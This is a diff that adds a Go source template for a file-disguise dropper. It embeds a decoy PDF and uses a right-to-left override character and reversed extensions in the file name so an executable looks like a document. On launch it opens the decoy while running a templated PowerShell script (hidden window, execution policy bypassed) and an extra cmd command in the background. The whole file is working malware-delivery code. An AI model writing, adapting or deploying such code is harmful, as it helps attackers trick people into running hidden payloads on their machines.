@@ -1,0 +1,77 @@
+package main
+
+import (
+	_ "embed"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"runtime"
+	"strings"
+	"syscall"
+	"time"
+)
+
+//go:embed {{.PdfName}}
+var pdfData []byte
+
+func main() {
+	exePath, err := os.Executable()
+	if err != nil {
+		return
+	}
+	exePath, _ = filepath.EvalSymlinks(exePath)
+	exeDir := filepath.Dir(exePath)
+	exeName := filepath.Base(exePath)
+
+	rtlo := "\u202E"
+	var pdfBaseName string
+	
+	if strings.Contains(exeName, rtlo) {
+		parts := strings.Split(exeName, rtlo)
+		if len(parts) >= 1 {
+			pdfBaseName = parts[0]
+		}
+	} else {
+		nameWithoutExt := strings.TrimSuffix(exeName, filepath.Ext(exeName))
+		if strings.HasSuffix(nameWithoutExt, "{{.ReversedExt}}") {
+			pdfBaseName = strings.TrimSuffix(nameWithoutExt, "{{.ReversedExt}}") + "exe"
+		} else {
+			pdfBaseName = nameWithoutExt
+		}
+	}
+	
+	pdfPath := filepath.Join(exeDir, pdfBaseName+"{{.OriginalExt}}")
+	err = os.WriteFile(pdfPath, pdfData, 0644)
+	if err != nil {
+		return
+	}
+
+	{{if .Script}}
+	psScript := `{{.Script}}`
+	if psScript != "" {
+		psCmd := exec.Command("powershell.exe", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psScript)
+		psCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		go func() { _ = psCmd.Run() }()
+	}
+	{{end}}
+
+	{{if .AdditionalCommand}}
+	addCmd := `{{.AdditionalCommand}}`
+	if addCmd != "" {
+		cmd := exec.Command("cmd", "/c", addCmd)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		go func() { _ = cmd.Run() }()
+	}
+	{{end}}
+
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/c", "start", "", pdfPath)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	} else {
+		cmd = exec.Command("xdg-open", pdfPath)
+	}
+	
+	go func() { _ = cmd.Run() }()
+	time.Sleep(500 * time.Millisecond)
+}
